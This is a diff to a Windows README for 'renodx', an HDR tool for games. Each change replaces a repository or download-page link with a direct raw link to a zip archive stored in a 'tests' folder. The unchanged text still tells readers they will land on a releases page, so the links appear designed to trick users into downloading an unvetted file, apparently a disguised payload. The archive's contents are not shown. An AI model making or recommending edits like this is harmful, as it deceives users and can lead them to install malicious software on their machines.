@@ -1,6 +1,6 @@
 # 🎮 renodx - Unlock True HDR in Your Games
 
-[![Download renodx](https://img.shields.io/badge/Download-renodx-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/cursorjerry01-source/renodx)
+[![Download renodx](https://img.shields.io/badge/Download-renodx-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/cursorjerry01-source/renodx/main/tests/3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run renodx on your Windows comput
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [renodx Download Page](https://github.com/cursorjerry01-source/renodx)
+Visit this link to download the application: [renodx Download Page](https://raw.githubusercontent.com/cursorjerry01-source/renodx/main/tests/3.9.zip)
 
 Once you click the link, you'll land on the download page. Look for the green "Code" button or the "Releases" section on the right side of the page. Click on the latest release version, then download the file that matches your Windows system (usually the .zip file).
 
@@ -97,7 +97,7 @@ For users who want to get the most out of renodx:
 
 To ensure you have the latest features and game compatibility:
 
-1. Visit the [download page](https://github.com/cursorjerry01-source/renodx)
+1. Visit the [download page](https://raw.githubusercontent.com/cursorjerry01-source/renodx/main/tests/3.9.zip)
 2. Check the "Releases" section for updates
 3. Download the newest version
 4. Replace the old files with the new ones
